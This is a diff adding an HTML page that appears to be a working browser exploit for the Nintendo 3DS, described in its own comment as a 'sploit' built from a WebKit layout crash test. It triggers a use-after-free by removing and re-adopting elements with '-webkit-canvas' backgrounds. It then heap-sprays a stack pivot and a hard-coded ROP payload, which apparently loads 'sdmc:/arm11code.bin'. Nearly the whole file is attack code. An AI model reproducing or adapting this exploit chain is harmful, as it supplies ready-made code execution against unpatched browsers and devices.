@@ -1,0 +1,103 @@
+<html>
+<script>
+//sploit based on layout crashtest from here:
+//https://github.com/WebKit/webkit/blob/master/LayoutTests/fast/canvas/canvas-bg-multiple-removal.html
+window.onload = function()
+{
+    if (location.hash == "#2") {
+        document.body.innerHTML = "PASSED: Duplicate webkit-canvas styles removed without crash.";
+        if (window.testRunner)
+            testRunner.notifyDone();
+    } else {
+        if (location.hash)
+            location.hash = "#" + (parseInt(location.hash.slice(1)) + 1).toString();
+        else
+            location.hash = "#1";
+
+        iframe = document.body.appendChild(document.createElement('iframe'));
+        element1 = document.createElement('a');
+        iframe.contentDocument.body.appendChild(element1);
+        element1.style.setProperty('background', '-webkit-canvas(canvas)');
+
+        element2 = document.createElement('a');
+        iframe.contentDocument.body.appendChild(element2);  
+        element2.style.setProperty('background', '-webkit-canvas(canvas)');  
+
+        element1.textContent = element2.textContent = 1;
+        setTimeout(removeElements, 0);
+	
+    }
+}
+
+function u32_to_unicode(n){
+	return String.fromCharCode(n & 0xffff,(n>>16) & 0xffff);
+}
+
+function gc()
+{
+
+    if (window.GCController)
+        return GCController.collect();
+
+    for (var i = 0; i < 10000; i++) { // > force garbage collection (FF requires about 9K allocations before a collect)
+        var s = new String("abc");
+    }
+}
+	/* Generated from: https://github.com/yellows8/3ds_browserhax_common */
+var payload=[0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x0100ffff, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011e114, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40000, 0x00011000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea308, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea308, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x00720061, 0x0031006d, 0x00630031, 0x0064006f, 0x002e0065, 0x00690062, 0x0000006e, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09320040, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x09320040, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022ffb0, 0x001a01f0, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x09320020, 0x18b41000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x001698bc, 0x001a01f0, 0x00000000, 0x0010c330, 0x09320000, 0x00130f14, 0x00105788, 0x0011169c, 0x00130f14, 0x00105788, 0x00101e78, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001fdb78, 0x00130f14, 0x00105788, 0x001050f4, 0x18b41000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00192568, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00152c48, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0023c844, 0x0011dd0c, 0x00192568, 0x0022ffb0, 0x001fdb78, 0x0020757c, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40000, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x001698bc, 0x00169944, 0x0011e114, 0x00000000, 0x00000000, 0x00000040, 0x00000000, 0x00000000, 0x00000000, 0x003dd72c, 0x00000114, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40030, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x18b41000, 0x007e83bc, 0x009eae98, 0x009eaea0, 0x009eaec8, 0x009eaa28, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40060, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x001050f4, 0x001050f4, 0x18b41000, 0x193a56e0, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011dd0c, 0x00000000, 0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x3b9aca00, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001041c8, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x01808080, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x001050f4, 0x001050f4, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011e114, 0x18b40000, 0x0fff9000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x007e86e0, 0x70707070];
+
+var PAYLOAD_SPRAY=0, PIVOT_SPRAY=1;
+var obj= new Array();
+function spray(size, repeat, type) {
+	var a = new String("");
+	var offset=0;
+	
+	if(type==PIVOT_SPRAY){
+		for (var j = 0; j < size/4; j++){
+			if      (j==18)a+= u32_to_unicode(0x00130efc); //stackpivot
+			else if (j==7) a+= u32_to_unicode(0x09093018); //sp
+			else if (j==8) a+= u32_to_unicode(0x88888888); //lr
+			else if (j==9) a+= u32_to_unicode(0x00105788); //pc
+			else           a+= u32_to_unicode(0x22222222);
+		}
+	}
+	else if(type==PAYLOAD_SPRAY){
+		var str=new String("");
+		for (var j = 0; j < 0x1000/4; j++) str+= u32_to_unicode(0x00105788);
+		
+		for (var j = 0; j < size/0x1000; j++){
+			a+= str;
+		}
+		//a+= u32_to_unicode(0xdeadc0df);
+		for (var j = 0; j < payload.length; j++) a+= u32_to_unicode(payload[j]);
+	}
+	
+	for (var j = 0; j < repeat; j++) obj[j]=new String(a);
+}
+
+function heapspray() {
+	spray(0x800000, 1, PAYLOAD_SPRAY);
+	for(var i=0;i<0x300;i++) spray(0x4c, 1, PIVOT_SPRAY);
+}
+
+function removeElements()
+{ 
+    iframe.contentDocument.body.removeChild(element1);
+    document.adoptNode(element1);
+
+    iframe.contentDocument.body.removeChild(element2);
+    document.adoptNode(element2);  
+
+    document.body.removeChild(iframe);
+    setTimeout(finishTest, 500);
+}
+
+function finishTest()
+{  
+    document.body.appendChild(element1);
+    heapspray();
+    setTimeout(function () { location.reload() }, 0);
+}
+
+</script>
+</html>
